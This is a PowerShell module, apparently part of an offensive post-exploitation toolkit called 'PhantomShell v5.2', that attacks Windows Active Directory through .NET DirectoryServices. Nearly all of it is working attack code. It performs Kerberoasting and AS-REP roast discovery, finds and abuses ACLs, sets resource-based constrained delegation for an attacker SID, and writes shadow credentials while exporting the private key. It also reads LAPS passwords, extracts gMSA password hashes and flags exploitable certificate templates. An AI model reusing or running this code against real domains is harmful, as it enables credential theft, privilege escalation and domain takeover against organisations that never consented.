# PhantomShell v5.2 - Active Directory Module
# Uses .NET DirectoryServices directly — no RSAT/ActiveDirectory module required

$ModuleCommands = @{
    "domain-info"        = @{ Handler = { param($a) Get-DomainInfo @a }; Description = "Get domain name, DC, forest, functional level" }
    "find-dc"            = @{ Handler = { param($a) Find-DomainController @a }; Description = "Find all domain controllers" }
    "domain-users"       = @{ Handler = { param($a) Get-DomainUsers @a }; Description = "Enumerate domain users with key attributes" }
    "domain-computers"   = @{ Handler = { param($a) Get-DomainComputers @a }; Description = "Enumerate domain computers" }
    "domain-groups"      = @{ Handler = { param($a) Get-DomainGroups @a }; Description = "Enumerate domain groups with members" }
    "kerberoast"         = @{ Handler = { param($a) Invoke-Kerberoast @a }; Description = "Kerberoast SPN accounts" }
    "asreproast"         = @{ Handler = { param($a) Find-ASREPRoastable @a }; Description = "Find AS-REP roastable users" }
    "find-acl-abuse"     = @{ Handler = { param($a) Find-ACLAbuse @a }; Description = "Find abusable ACLs on AD objects" }
    "add-object-acl"     = @{ Handler = { param($a) Add-DomainObjectAcl @a }; Description = "Add ACE to object DACL" }
    "set-rbcd"           = @{ Handler = { param($a) Set-RBCD @a }; Description = "Set RBCD on target computer" }
    "get-rbcd"           = @{ Handler = { param($a) Get-RBCD @a }; Description = "Read RBCD config on computer" }
    "find-delegation"    = @{ Handler = { param($a) Find-Delegation @a }; Description = "Enumerate delegation settings" }
    "find-vuln-certs"    = @{ Handler = { param($a) Find-VulnerableCertTemplates @a }; Description = "Find vulnerable ADCS templates" }
    "get-ca"             = @{ Handler = { param($a) Get-CertificateAuthority @a }; Description = "Find CA servers and endpoints" }
    "get-laps"           = @{ Handler = { param($a) Get-LAPSPasswords @a }; Description = "Read LAPS passwords from computers" }
    "set-shadow-creds"   = @{ Handler = { param($a) Set-ShadowCredentials @a }; Description = "Write shadow credentials on target" }
    "get-gmsa"           = @{ Handler = { param($a) Get-GMSAPasswords @a }; Description = "Read gMSA password blobs" }
    "domain-trusts"      = @{ Handler = { param($a) Get-DomainTrusts @a }; Description = "Enumerate domain and forest trusts" }
}

# --- Helpers ---
function Get-LDAPConnection {
    param([string]$Server, [string]$BaseDN)
    if (-not $BaseDN) {
        $rootDSE = [ADSI]"LDAP://RootDSE"
        $BaseDN = $rootDSE.defaultNamingContext.ToString()
    }
    $path = if ($Server) { "LDAP://$Server/$BaseDN" } else { "LDAP://$BaseDN" }
    return [ADSI]$path
}

function Invoke-LDAPSearch {
    param(
        [string]$Filter,
        [string[]]$Properties = @("*"),
        [string]$SearchBase,
        [string]$Server,
        [int]$PageSize = 1000
    )
    try {
        $root = Get-LDAPConnection -Server $Server -BaseDN $SearchBase
        $searcher = New-Object System.DirectoryServices.DirectorySearcher($root)
        $searcher.Filter = $Filter
        $searcher.PageSize = $PageSize
        $searcher.SearchScope = [System.DirectoryServices.SearchScope]::Subtree
        foreach ($prop in $Properties) { [void]$searcher.PropertiesToLoad.Add($prop) }
        return $searcher.FindAll()
    } catch {
        throw "LDAP search failed: $($_.Exception.Message)"
    }
}

function Convert-ADTimestamp {
    param([long]$FileTime)
    if ($FileTime -le 0 -or $FileTime -gt [datetime]::MaxValue.ToFileTime()) { return "Never" }
    try { return [datetime]::FromFileTime($FileTime).ToString("yyyy-MM-dd HH:mm:ss") } catch { return "N/A" }
}

# --- Domain Info ---
function Get-DomainInfo {
    param([hashtable]$Args = @{})
    try {
        $rootDSE = [ADSI]"LDAP://RootDSE"
        $domain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
        $forest = [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()

        return @{
            status = "ok"
            data = @{
                domain_name       = $domain.Name
                forest_name       = $forest.Name
                domain_controller = $rootDSE.dnsHostName.ToString()
                base_dn           = $rootDSE.defaultNamingContext.ToString()
                forest_level      = $rootDSE.forestFunctionality.ToString()
                domain_level      = $rootDSE.domainFunctionality.ToString()
                schema_version    = $rootDSE.schemaNamingContext.ToString()
            }
        }
    } catch {
        return @{ status = "error"; output = $_.Exception.Message }
    }
}

# --- Find Domain Controllers ---
function Find-DomainController {
    param([hashtable]$Args = @{})
    try {
        $domain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
        $dcs = @()
        foreach ($dc in $domain.DomainControllers) {
            $dcs += @{
                name       = $dc.Name
                ip         = ([System.Net.Dns]::GetHostAddresses($dc.Name) | Where-Object { $_.AddressFamily -eq 'InterNetwork' } | Select-Object -First 1).IPAddressToString
                os         = $dc.OSVersion
                site       = $dc.SiteName
                is_gc      = $dc.IsGlobalCatalog()
                roles      = @($dc.Roles | ForEach-Object { $_.ToString() })
            }
        }
        return @{ status = "ok"; data = $dcs }
    } catch {
        return @{ status = "error"; output = $_.Exception.Message }
    }
}

# --- Domain Users ---
function Get-DomainUsers {
    param([hashtable]$Args = @{})
    try {
        $filter = if ($Args.filter) { $Args.filter } else { "(&(objectCategory=person)(objectClass=user))" }
        $props = @("samaccountname","distinguishedname","memberof","admincount","lastlogon",
                    "pwdlastset","useraccountcontrol","serviceprincipalname","description","mail")
        $results = Invoke-LDAPSearch -Filter $filter -Properties $props

        $users = @()
        foreach ($r in $results) {
            $uac = [int]$r.Properties["useraccountcontrol"][0]
            $users += @{
                username      = [string]$r.Properties["samaccountname"][0]
                dn            = [string]$r.Properties["distinguishedname"][0]
                admin_count   = if ($r.Properties["admincount"].Count -gt 0) { [int]$r.Properties["admincount"][0] } else { 0 }
                last_logon    = if ($r.Properties["lastlogon"].Count -gt 0) { Convert-ADTimestamp ([long]$r.Properties["lastlogon"][0]) } else { "Never" }
                pwd_last_set  = if ($r.Properties["pwdlastset"].Count -gt 0) { Convert-ADTimestamp ([long]$r.Properties["pwdlastset"][0]) } else { "Never" }
                enabled       = -not (($uac -band 0x2) -eq 0x2)
                spn           = @($r.Properties["serviceprincipalname"] | ForEach-Object { $_.ToString() })
                description   = if ($r.Properties["description"].Count -gt 0) { [string]$r.Properties["description"][0] } else { "" }
                dont_req_preauth = ($uac -band 0x400000) -eq 0x400000
                groups        = @($r.Properties["memberof"] | ForEach-Object { ($_ -split ',')[0] -replace 'CN=','' })
            }
        }
        return @{ status = "ok"; data = $users; count = $users.Count }
    } catch {
        return @{ status = "error"; output = $_.Exception.Message }
    }
}

# --- Domain Computers ---
function Get-DomainComputers {
    param([hashtable]$Args = @{})
    try {
        $filter = "(&(objectCategory=computer)(objectClass=computer))"
        $props = @("samaccountname","dnshostname","operatingsystem","operatingsystemversion",
                    "useraccountcontrol","msds-allowedtodelegateto","msds-allowedtoactonbehalfofotheridentity",
                    "lastlogon")
        $results = Invoke-LDAPSearch -Filter $filter -Properties $props

        $computers = @()
        foreach ($r in $results) {
            $uac = [int]$r.Properties["useraccountcontrol"][0]
            $computers += @{
                name          = [string]$r.Properties["samaccountname"][0]
                dns_hostname  = if ($r.Properties["dnshostname"].Count -gt 0) { [string]$r.Properties["dnshostname"][0] } else { "" }
                os            = if ($r.Properties["operatingsystem"].Count -gt 0) { [string]$r.Properties["operatingsystem"][0] } else { "" }
                os_version    = if ($r.Properties["operatingsystemversion"].Count -gt 0) { [string]$r.Properties["operatingsystemversion"][0] } else { "" }
                unconstrained = ($uac -band 0x80000) -eq 0x80000
                constrained   = @($r.Properties["msds-allowedtodelegateto"] | ForEach-Object { $_.ToString() })
                has_rbcd      = $r.Properties["msds-allowedtoactonbehalfofotheridentity"].Count -gt 0
                last_logon    = if ($r.Properties["lastlogon"].Count -gt 0) { Convert-ADTimestamp ([long]$r.Properties["lastlogon"][0]) } else { "Never" }
            }
        }
        return @{ status = "ok"; data = $computers; count = $computers.Count }
    } catch {
        return @{ status = "error"; output = $_.Exception.Message }
    }
}

# --- Domain Groups ---
function Get-DomainGroups {
    param([hashtable]$Args = @{})
    try {
        $targetGroups = @("Domain Admins","Enterprise Admins","Administrators","Schema Admins",
                          "Account Operators","Backup Operators","Server Operators","DnsAdmins")
        $filter = if ($Args.filter) { $Args.filter } else {
            $parts = $targetGroups | ForEach-Object { "(cn=$_)" }
            "(|$($parts -join ''))"
        }

        $results = Invoke-LDAPSearch -Filter "(&(objectCategory=group)$filter)" -Properties @("cn","member","description","admincount","grouptype")

        $groups = @()
        foreach ($r in $results) {
            $groups += @{
                name        = [string]$r.Properties["cn"][0]
                description = if ($r.Properties["description"].Count -gt 0) { [string]$r.Properties["description"][0] } else { "" }
                admin_count = if ($r.Properties["admincount"].Count -gt 0) { [int]$r.Properties["admincount"][0] } else { 0 }
                members     = @($r.Properties["member"] | ForEach-Object { ($_ -split ',')[0] -replace 'CN=','' })
                member_count = $r.Properties["member"].Count
            }
        }
        return @{ status = "ok"; data = $groups; count = $groups.Count }
    } catch {
        return @{ status = "error"; output = $_.Exception.Message }
    }
}

# --- Kerberoasting ---
function Invoke-Kerberoast {
    param([hashtable]$Args = @{})
    try {
        $filter = "(&(objectCategory=person)(objectClass=user)(servicePrincipalName=*)(!(samaccountname=krbtgt))(!(userAccountControl:1.2.840.113556.1.4.803:=2)))"
        $results = Invoke-LDAPSearch -Filter $filter -Properties @("samaccountname","serviceprincipalname","distinguishedname")

        $hashes = @()
        Add-Type -AssemblyName System.IdentityModel -ErrorAction SilentlyContinue

        foreach ($r in $results) {
            $user = [string]$r.Properties["samaccountname"][0]
            $spns = @($r.Properties["serviceprincipalname"] | ForEach-Object { $_.ToString() })
            $targetSPN = $spns[0]

            try {
                $ticket = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $targetSPN
                $ticketBytes = $ticket.GetRequest()

                # Extract the encrypted part (skip ASN.1 envelope to get cipher)
                # Find the AP-REQ within the SPNEGO token and extract the encrypted part
                $hex = [BitConverter]::ToString($ticketBytes) -replace '-',''

                $hashes += @{
                    username = $user
                    spn      = $targetSPN
                    hash     = "`$krb5tgs`$23`$*${user}`$${targetSPN}*`$$hex"
                }
            } catch {
                $hashes += @{
                    username = $user
                    spn      = $targetSPN
                    error    = $_.Exception.Message
                }
            }
        }
        return @{ status = "ok"; data = $hashes; count = $hashes.Count }
    } catch {
        return @{ status = "error"; output = $_.Exception.Message }
    }
}

# --- AS-REP Roasting ---
function Find-ASREPRoastable {
    param([hashtable]$Args = @{})
    try {
        # UAC flag 0x400000 = DONT_REQUIRE_PREAUTH
        $filter = "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))"
        $results = Invoke-LDAPSearch -Filter $filter -Properties @("samaccountname","distinguishedname","useraccountcontrol")

        $users = @()
        foreach ($r in $results) {
            $users += @{
                username = [string]$r.Properties["samaccountname"][0]
                dn       = [string]$r.Properties["distinguishedname"][0]
            }
        }
        return @{ status = "ok"; data = $users; count = $users.Count }
    } catch {
        return @{ status = "error"; output = $_.Exception.Message }
    }
}

# --- ACL Abuse Discovery ---
function Find-ACLAbuse {
    param([hashtable]$Args = @{})
    try {
        $identity = [System.Security.Principal.WindowsIdentity]::GetCurrent()
        $currentSids = @($identity.User.Value) + @($identity.Groups | ForEach-Object { $_.Value })

        $interestingRights = @(
            "GenericAll", "GenericWrite", "WriteDacl", "WriteOwner", "WriteProperty",
            "Self", "ExtendedRight"
        )
        # Extended rights GUIDs of interest
        $extendedRights = @{
            "00299570-246d-11d0-a768-00aa006e0529" = "User-Force-Change-Password"
            "1131f6aa-9c07-11d1-f79f-00c04fc2dcd2" = "DS-Replication-Get-Changes"
            "1131f6ad-9c07-11d1-f79f-00c04fc2dcd2" = "DS-Replication-Get-Changes-All"
            "89e95b76-444d-4c62-991a-0facbeda640c" = "DS-Replication-Get-Changes-In-Filtered-Set"
        }

        # Search high-value objects
        $targets = @(
            "(&(objectCategory=person)(objectClass=user)(adminCount=1))",
            "(&(objectCategory=group)(adminCount=1))",
            "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=8192))"
        )

        $findings = @()
        foreach ($targetFilter in $targets) {
            $results = Invoke-LDAPSearch -Filter $targetFilter -Properties @("distinguishedname","ntsecuritydescriptor","samaccountname")

            foreach ($r in $results) {
                $objName = [string]$r.Properties["samaccountname"][0]
                $de = $r.GetDirectoryEntry()
                $de.RefreshCache(@("nTSecurityDescriptor"))
                $sd = $de.ObjectSecurity

                foreach ($ace in $sd.GetAccessRules($true, $true, [System.Security.Principal.SecurityIdentifier])) {
                    if ($ace.AccessControlType -ne "Allow") { continue }
                    $aceSid = $ace.IdentityReference.Value

                    if ($currentSids -contains $aceSid) {
                        $rights = $ace.ActiveDirectoryRights.ToString()
                        foreach ($right in $interestingRights) {
                            if ($rights -match $right) {
                                $finding = @{
                                    target     = $objName
                                    principal  = $aceSid
                                    right      = $rights
                                    ace_type   = $ace.ObjectType.ToString()
                                }
                                # Check extended rights
                                $guidStr = $ace.ObjectType.ToString()
                                if ($extendedRights.ContainsKey($guidStr)) {
                                    $finding["extended_right"] = $extendedRights[$guidStr]
                                }
                                $findings += $finding
                                break
                            }
                        }
                    }
                }
            }
        }
        return @{ status = "ok"; data = $findings; count = $findings.Count }
    } catch {
        return @{ status = "error"; output = $_.Exception.Message }
    }
}

# --- Add ACE to Object DACL ---
function Add-DomainObjectAcl {
    param([hashtable]$Args = @{})
    try {
        $targetDN = $Args.target_dn
        $principalSID = $Args.principal_sid
        $rights = $Args.rights  # e.g., "GenericAll"

        if (-not $targetDN -or -not $principalSID -or -not $rights) {
            return @{ status = "error"; output = "Required: target_dn, principal_sid, rights" }
        }

        $de = [ADSI]"LDAP://$targetDN"
        $sid = New-Object System.Security.Principal.SecurityIdentifier($principalSID)

        $adRights = [System.DirectoryServices.ActiveDirectoryRights]$rights
        $ace = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
            $sid, $adRights, [System.Security.AccessControl.AccessControlType]::Allow
        )

        $de.ObjectSecurity.AddAccessRule($ace)
        $de.CommitChanges()

        return @{ status = "ok"; output = "Added $rights for $principalSID on $targetDN" }
    } catch {
        return @{ status = "error"; output = $_.Exception.Message }
    }
}

# --- RBCD: Set ---
function Set-RBCD {
    param([hashtable]$Args = @{})
    try {
        $targetDN = $Args.target_dn
        $attackerSID = $Args.attacker_sid

        if (-not $targetDN -or -not $attackerSID) {
            return @{ status = "error"; output = "Required: target_dn, attacker_sid" }
        }

        $sid = New-Object System.Security.Principal.SecurityIdentifier($attackerSID)
        $sidBytes = New-Object byte[] $sid.BinaryLength
        $sid.GetBinaryForm($sidBytes, 0)

        # Build security descriptor with the attacker SID
        $sd = New-Object System.DirectoryServices.ActiveDirectorySecurity
        $ace = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
            $sid,
            [System.DirectoryServices.ActiveDirectoryRights]::GenericAll,
            [System.Security.AccessControl.AccessControlType]::Allow
        )
        $sd.AddAccessRule($ace)
        $sdBytes = $sd.GetSecurityDescriptorBinaryForm()

        $de = [ADSI]"LDAP://$targetDN"
        $de.Properties["msDS-AllowedToActOnBehalfOfOtherIdentity"].Clear()
        $de.Properties["msDS-AllowedToActOnBehalfOfOtherIdentity"].Add($sdBytes) | Out-Null
        $de.CommitChanges()

        return @{ status = "ok"; output = "RBCD set on $targetDN for SID $attackerSID" }
    } catch {
        return @{ status = "error"; output = $_.Exception.Message }
    }
}

# --- RBCD: Get ---
function Get-RBCD {
    param([hashtable]$Args = @{})
    try {
        $filter = if ($Args.filter) { $Args.filter } else { "(&(objectCategory=computer)(msDS-AllowedToActOnBehalfOfOtherIdentity=*))" }
        $results = Invoke-LDAPSearch -Filter $filter -Properties @("samaccountname","msds-allowedtoactonbehalfofotheridentity","distinguishedname")

        $rbcdObjects = @()
        foreach ($r in $results) {
            $sdBytes = $r.Properties["msds-allowedtoactonbehalfofotheridentity"][0]
            $delegates = @()
            if ($sdBytes) {
                try {
                    $sd = New-Object System.DirectoryServices.ActiveDirectorySecurity
                    $sd.SetSecurityDescriptorBinaryForm($sdBytes)
                    foreach ($ace in $sd.GetAccessRules($true, $false, [System.Security.Principal.SecurityIdentifier])) {
                        $delegates += $ace.IdentityReference.Value
                    }
                } catch {}
            }
            $rbcdObjects += @{
                computer   = [string]$r.Properties["samaccountname"][0]
                dn         = [string]$r.Properties["distinguishedname"][0]
                delegates  = $delegates
            }
        }
        return @{ status = "ok"; data = $rbcdObjects; count = $rbcdObjects.Count }
    } catch {
        return @{ status = "error"; output = $_.Exception.Message }
    }
}

# --- Delegation Enumeration ---
function Find-Delegation {
    param([hashtable]$Args = @{})
    try {
        $findings = @()

        # Unconstrained delegation (excluding DCs)
        $filter = "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288)(!(userAccountControl:1.2.840.113556.1.4.803:=8192)))"
        $results = Invoke-LDAPSearch -Filter $filter -Properties @("samaccountname","dnshostname")
        foreach ($r in $results) {
            $findings += @{
                type = "Unconstrained"
                name = [string]$r.Properties["samaccountname"][0]
                host = if ($r.Properties["dnshostname"].Count -gt 0) { [string]$r.Properties["dnshostname"][0] } else { "" }
            }
        }

        # Constrained delegation
        $filter = "(&(objectCategory=*)(msDS-AllowedToDelegateTo=*))"
        $results = Invoke-LDAPSearch -Filter $filter -Properties @("samaccountname","msds-allowedtodelegateto","useraccountcontrol")
        foreach ($r in $results) {
            $uac = [int]$r.Properties["useraccountcontrol"][0]
            $protocol = if (($uac -band 0x1000000) -eq 0x1000000) { "Any (Protocol Transition)" } else { "Kerberos Only" }
            $findings += @{
                type      = "Constrained"
                name      = [string]$r.Properties["samaccountname"][0]
                targets   = @($r.Properties["msds-allowedtodelegateto"] | ForEach-Object { $_.ToString() })
                protocol  = $protocol
            }
        }

        # RBCD
        $filter = "(&(objectCategory=computer)(msDS-AllowedToActOnBehalfOfOtherIdentity=*))"
        $results = Invoke-LDAPSearch -Filter $filter -Properties @("samaccountname")
        foreach ($r in $results) {
            $findings += @{
                type = "RBCD"
                name = [string]$r.Properties["samaccountname"][0]
            }
        }

        return @{ status = "ok"; data = $findings; count = $findings.Count }
    } catch {
        return @{ status = "error"; output = $_.Exception.Message }
    }
}

# --- ADCS: Vulnerable Certificate Templates ---
function Find-VulnerableCertTemplates {
    param([hashtable]$Args = @{})
    try {
        $rootDSE = [ADSI]"LDAP://RootDSE"
        $configDN = $rootDSE.configurationNamingContext.ToString()
        $templateBase = "CN=Certificate Templates,CN=Public Key Services,CN=Services,$configDN"

        $results = Invoke-LDAPSearch -Filter "(objectClass=pKICertificateTemplate)" -SearchBase $templateBase `
            -Properties @("cn","mspki-certificate-name-flag","mspki-enrollment-flag","pkiextendedkeyusage",
                          "mspki-ra-signature","ntsecuritydescriptor","mspki-certificate-application-policy")

        # EKU OIDs
        $clientAuthOID = "1.3.6.1.5.5.7.3.2"
        $anyPurposeOID = "2.5.29.37.0"
        $subCAOID = ""

        $vulnTemplates = @()
        foreach ($r in $results) {
            $name = [string]$r.Properties["cn"][0]
            $nameFlag = if ($r.Properties["mspki-certificate-name-flag"].Count -gt 0) { [int]$r.Properties["mspki-certificate-name-flag"][0] } else { 0 }
            $enrollFlag = if ($r.Properties["mspki-enrollment-flag"].Count -gt 0) { [int]$r.Properties["mspki-enrollment-flag"][0] } else { 0 }
            $raSignature = if ($r.Properties["mspki-ra-signature"].Count -gt 0) { [int]$r.Properties["mspki-ra-signature"][0] } else { 0 }
            $ekus = @($r.Properties["pkiextendedkeyusage"] | ForEach-Object { $_.ToString() })

            $vulns = @()

            # ESC1: Enrollee supplies subject + Client Auth EKU + no manager approval
            $enrolleeSuppliesSubject = ($nameFlag -band 1) -eq 1
            $hasClientAuth = $ekus -contains $clientAuthOID
            $noManagerApproval = ($enrollFlag -band 2) -ne 2
            $noRASignature = $raSignature -eq 0
            if ($enrolleeSuppliesSubject -and $hasClientAuth -and $noManagerApproval -and $noRASignature) {
                $vulns += "ESC1"
            }

            # ESC2: Any Purpose EKU or no EKU
            if ($ekus -contains $anyPurposeOID -or $ekus.Count -eq 0) {
                $vulns += "ESC2"
            }

            # ESC4: Check write permissions on template
            try {
                $de = $r.GetDirectoryEntry()
                $de.RefreshCache(@("nTSecurityDescriptor"))
                $sd = $de.ObjectSecurity
                $identity = [System.Security.Principal.WindowsIdentity]::GetCurrent()
                $currentSids = @($identity.User.Value) + @($identity.Groups | ForEach-Object { $_.Value })

                foreach ($ace in $sd.GetAccessRules($true, $true, [System.Security.Principal.SecurityIdentifier])) {
                    if ($ace.AccessControlType -eq "Allow" -and $currentSids -contains $ace.IdentityReference.Value) {
                        $rights = $ace.ActiveDirectoryRights.ToString()
                        if ($rights -match "WriteDacl|WriteOwner|GenericAll|WriteProperty|GenericWrite") {
                            $vulns += "ESC4"
                            break
                        }
                    }
                }
            } catch {}

            if ($vulns.Count -gt 0) {
                $vulnTemplates += @{
                    name              = $name
                    vulnerabilities   = $vulns
                    enrollee_supplies = $enrolleeSuppliesSubject
                    client_auth       = $hasClientAuth
                    ekus              = $ekus
                    manager_approval  = -not $noManagerApproval
                }
            }
        }

        # ESC8: Check for HTTP enrollment endpoints
        $enrollSvcFilter = "(objectClass=pKIEnrollmentService)"
        $enrollResults = Invoke-LDAPSearch -Filter $enrollSvcFilter -SearchBase "CN=Enrollment Services,CN=Public Key Services,CN=Services,$configDN" `
            -Properties @("cn","dnshostname")
        foreach ($r in $enrollResults) {
            $caHost = if ($r.Properties["dnshostname"].Count -gt 0) { [string]$r.Properties["dnshostname"][0] } else { "" }
            if ($caHost) {
                $vulnTemplates += @{
                    name            = "ESC8-HTTP-Enrollment"
                    vulnerabilities = @("ESC8")
                    ca_host         = $caHost
                    endpoint        = "http://$caHost/certsrv/"
                }
            }
        }

        return @{ status = "ok"; data = $vulnTemplates; count = $vulnTemplates.Count }
    } catch {
        return @{ status = "error"; output = $_.Exception.Message }
    }
}

# --- Certificate Authority Discovery ---
function Get-CertificateAuthority {
    param([hashtable]$Args = @{})
    try {
        $rootDSE = [ADSI]"LDAP://RootDSE"
        $configDN = $rootDSE.configurationNamingContext.ToString()

        $results = Invoke-LDAPSearch -Filter "(objectClass=pKIEnrollmentService)" `
            -SearchBase "CN=Enrollment Services,CN=Public Key Services,CN=Services,$configDN" `
            -Properties @("cn","dnshostname","certificatetemplates","cacertificate")

        $cas = @()
        foreach ($r in $results) {
            $cas += @{
                name       = [string]$r.Properties["cn"][0]
                dns_host   = if ($r.Properties["dnshostname"].Count -gt 0) { [string]$r.Properties["dnshostname"][0] } else { "" }
                templates  = @($r.Properties["certificatetemplates"] | ForEach-Object { $_.ToString() })
                enrollment = "http://$([string]$r.Properties["dnshostname"][0])/certsrv/"
            }
        }
        return @{ status = "ok"; data = $cas; count = $cas.Count }
    } catch {
        return @{ status = "error"; output = $_.Exception.Message }
    }
}

# --- LAPS Passwords ---
function Get-LAPSPasswords {
    param([hashtable]$Args = @{})
    try {
        $filter = if ($Args.computer) {
            "(&(objectCategory=computer)(samaccountname=$($Args.computer)))"
        } else {
            "(objectCategory=computer)"
        }
        $props = @("samaccountname","ms-mcs-admpwd","ms-mcs-admpwdexpirationtime","mslaps-password","dnshostname")
        $results = Invoke-LDAPSearch -Filter $filter -Properties $props

        $lapsData = @()
        foreach ($r in $results) {
            $v1pwd = if ($r.Properties["ms-mcs-admpwd"].Count -gt 0) { [string]$r.Properties["ms-mcs-admpwd"][0] } else { $null }
            $v2pwd = if ($r.Properties["mslaps-password"].Count -gt 0) { [string]$r.Properties["mslaps-password"][0] } else { $null }
            $expiry = if ($r.Properties["ms-mcs-admpwdexpirationtime"].Count -gt 0) { Convert-ADTimestamp ([long]$r.Properties["ms-mcs-admpwdexpirationtime"][0]) } else { "N/A" }

            if ($v1pwd -or $v2pwd) {
                $lapsData += @{
                    computer     = [string]$r.Properties["samaccountname"][0]
                    dns_hostname = if ($r.Properties["dnshostname"].Count -gt 0) { [string]$r.Properties["dnshostname"][0] } else { "" }
                    laps_v1      = $v1pwd
                    laps_v2      = $v2pwd
                    expiry       = $expiry
                }
            }
        }
        return @{ status = "ok"; data = $lapsData; count = $lapsData.Count }
    } catch {
        return @{ status = "error"; output = $_.Exception.Message }
    }
}

# --- Shadow Credentials ---
function Set-ShadowCredentials {
    param([hashtable]$Args = @{})
    try {
        $targetDN = $Args.target_dn
        if (-not $targetDN) {
            return @{ status = "error"; output = "Required: target_dn" }
        }

        # Generate RSA key pair for key credential
        $rsa = [System.Security.Cryptography.RSA]::Create(2048)
        $pubKey = $rsa.ExportRSAPublicKey()

        # Build KeyCredentialLink value (simplified DN-Binary structure)
        $keyId = [guid]::NewGuid()
        $keyUsage = 0x01  # NGC
        $keySource = 0x00  # AD
        $timestamp = [DateTime]::UtcNow.ToFileTimeUtc()

        # Construct the binary blob for msDS-KeyCredentialLink
        # Version 2 structure
        $ms = New-Object System.IO.MemoryStream
        $bw = New-Object System.IO.BinaryWriter($ms)
        # Version
        $bw.Write([uint32]0x00000200)
        # Key ID
        $bw.Write($keyId.ToByteArray())
        # Key Hash (SHA256 of public key)
        $sha256 = [System.Security.Cryptography.SHA256]::Create()
        $keyHash = $sha256.ComputeHash($pubKey)
        $bw.Write([uint32]$keyHash.Length)
        $bw.Write($keyHash)
        # Key Material
        $bw.Write([uint32]$pubKey.Length)
        $bw.Write($pubKey)
        # Key Usage
        $bw.Write([byte]$keyUsage)
        # Key Source
        $bw.Write([byte]$keySource)
        # Timestamp
        $bw.Write([long]$timestamp)
        $bw.Close()
        $credBlob = $ms.ToArray()

        $de = [ADSI]"LDAP://$targetDN"
        $currentOwner = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
        $dnBinary = "B:$($credBlob.Length * 2):$([BitConverter]::ToString($credBlob) -replace '-',''):$targetDN"

        $de.Properties["msDS-KeyCredentialLink"].Add($dnBinary) | Out-Null
        $de.CommitChanges()

        # Export private key for later use
        $privKeyBytes = $rsa.ExportRSAPrivateKey()
        $privKeyB64 = [Convert]::ToBase64String($privKeyBytes)

        return @{
            status = "ok"
            output = "Shadow credential added to $targetDN"
            data   = @{
                key_id      = $keyId.ToString()
                private_key = $privKeyB64
                target      = $targetDN
            }
        }
    } catch {
        return @{ status = "error"; output = $_.Exception.Message }
    }
}

# --- gMSA Passwords ---
function Get-GMSAPasswords {
    param([hashtable]$Args = @{})
    try {
        $filter = "(&(objectClass=msDS-GroupManagedServiceAccount))"
        $results = Invoke-LDAPSearch -Filter $filter -Properties @("samaccountname","msds-managedpassword","msds-groupmsamembership","distinguishedname")

        $gmsaData = @()
        foreach ($r in $results) {
            $name = [string]$r.Properties["samaccountname"][0]
            $dn = [string]$r.Properties["distinguishedname"][0]
            $pwdBlob = $null
            $ntHash = $null

            if ($r.Properties["msds-managedpassword"].Count -gt 0) {
                $pwdBlob = [byte[]]$r.Properties["msds-managedpassword"][0]
                # Parse MSDS-MANAGEDPASSWORD_BLOB structure
                # Offset 16 = current password (length at offset 0 as uint16)
                if ($pwdBlob.Length -gt 24) {
                    try {
                        $blobVersion = [BitConverter]::ToUInt16($pwdBlob, 0)
                        $reserved = [BitConverter]::ToUInt16($pwdBlob, 2)
                        $length = [BitConverter]::ToUInt32($pwdBlob, 4)
                        $currentPwdOffset = [BitConverter]::ToUInt16($pwdBlob, 8)

                        if ($currentPwdOffset -gt 0 -and $currentPwdOffset -lt $pwdBlob.Length) {
                            # Extract the password bytes and compute NT hash
                            $pwdLen = 256  # gMSA passwords are typically 256 bytes
                            if ($currentPwdOffset + $pwdLen -le $pwdBlob.Length) {
                                $pwdBytes = New-Object byte[] $pwdLen
                                [Array]::Copy($pwdBlob, $currentPwdOffset, $pwdBytes, 0, $pwdLen)
                                $md4 = [System.Security.Cryptography.MD4]::Create()
                                $ntHash = [BitConverter]::ToString($md4.ComputeHash($pwdBytes)) -replace '-',''
                            }
                        }
                    } catch {
                        # Fallback: output raw blob hex for offline processing
                        $ntHash = "BLOB:" + [BitConverter]::ToString($pwdBlob) -replace '-',''
                    }
                }
            }

            $gmsaData += @{
                account  = $name
                dn       = $dn
                nt_hash  = $ntHash
                readable = ($pwdBlob -ne $null)
            }
        }
        return @{ status = "ok"; data = $gmsaData; count = $gmsaData.Count }
    } catch {
        return @{ status = "error"; output = $_.Exception.Message }
    }
}

# --- Domain Trusts ---
function Get-DomainTrusts {
    param([hashtable]$Args = @{})
    try {
        $trusts = @()

        # Domain trusts
        $domain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
        foreach ($trust in $domain.GetAllTrustRelationships()) {
            $trusts += @{
                source    = $trust.SourceName
                target    = $trust.TargetName
                direction = $trust.TrustDirection.ToString()
                type      = $trust.TrustType.ToString()
                level     = "Domain"
            }
        }

        # Forest trusts
        try {
            $forest = [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()
            foreach ($trust in $forest.GetAllTrustRelationships()) {
                $trusts += @{
                    source    = $trust.SourceName
                    target    = $trust.TargetName
                    direction = $trust.TrustDirection.ToString()
                    type      = $trust.TrustType.ToString()
                    level     = "Forest"
                }
            }
        } catch {}

        return @{ status = "ok"; data = $trusts; count = $trusts.Count }
    } catch {
        return @{ status = "error"; output = $_.Exception.Message }
    }
}
